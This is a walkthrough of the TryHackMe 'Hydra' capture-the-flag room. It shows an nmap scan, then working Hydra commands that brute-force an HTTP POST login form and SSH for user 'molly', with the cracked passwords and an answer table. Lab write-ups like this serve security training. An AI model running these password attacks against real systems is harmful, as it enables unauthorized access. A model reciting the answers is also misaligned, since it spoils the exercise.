# Hydra

Welcome to the Hydra room walkthrough on TryHackMe!

{% embed url="https://tryhackme.com/room/hydra" %}

***

Hydra is an essential online password-cracking tool capable of performing rapid dictionary attacks against various network protocols, including SSH, FTP, HTTP forms, and SMB. In this room, we practice brute-forcing both an HTTP POST login form and an SSH service to recover credentials and capture the flags.

---

## 1. Network Reconnaissance & Port Scanning

We start by running an Nmap service scan against the target:

```bash
nmap -sC -sV -oN nmap_hydra.txt <TARGET_IP>
```

### Scan Results:
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

We have two services to attack:
- **Port 80 (HTTP)**: Web application with a login portal
- **Port 22 (SSH)**: Linux remote shell

---

## 2. Brute-Forcing the Web Login (Flag 1)

Opening `http://<TARGET_IP>/` in the browser presents a login form with username and password fields.

From the challenge description, we know the target username is **`molly`**.

### Inspecting the Request:
Submitting test credentials in the form with Burp Suite or browser Developer Tools shows:
- **Method:** `POST`
- **Endpoint:** `/login`
- **Parameters:** `username=molly&password=test`
- **Failure Message:** When a wrong password is submitted, the page returns `incorrect`.

### Launching the Hydra Web Attack:
We construct the Hydra command using the `http-post-form` module:

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

### Output:
```text
[80][http-post-form] host: <TARGET_IP>   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
```

The web password for `molly` is **`sunshine`**!

### Retrieving Flag 1:
Logging into `http://<TARGET_IP>/login` with credentials `molly` : `sunshine` brings us to the user dashboard where Flag 1 is displayed:

```text
flag{hidden}
```

---

## 3. Brute-Forcing SSH (Flag 2)

Next, we target the SSH service on port 22 for user `molly`.

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<TARGET_IP>
```

### Output:
```text
[22][ssh] host: <TARGET_IP>   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
```

The SSH password for `molly` is **`butterfly`**!

### Retrieving Flag 2:
We log into the machine via SSH:

```bash
ssh molly@<TARGET_IP>
```
Password: `butterfly`

Once logged in, we check the home directory:
```bash
molly@hydra:~$ ls -la
molly@hydra:~$ cat flag.txt
flag{hidden}
```

---

## 🏁 Questions & Answers

| Task / Question | Answer |
| :--- | :--- |
| **What is molly's web password?** | `sunshine` |
| **What is flag 1?** | `flag{hidden}` |
| **What is molly's SSH password?** | `butterfly` |
| **What is flag 2?** | `flag{hidden}` |

***
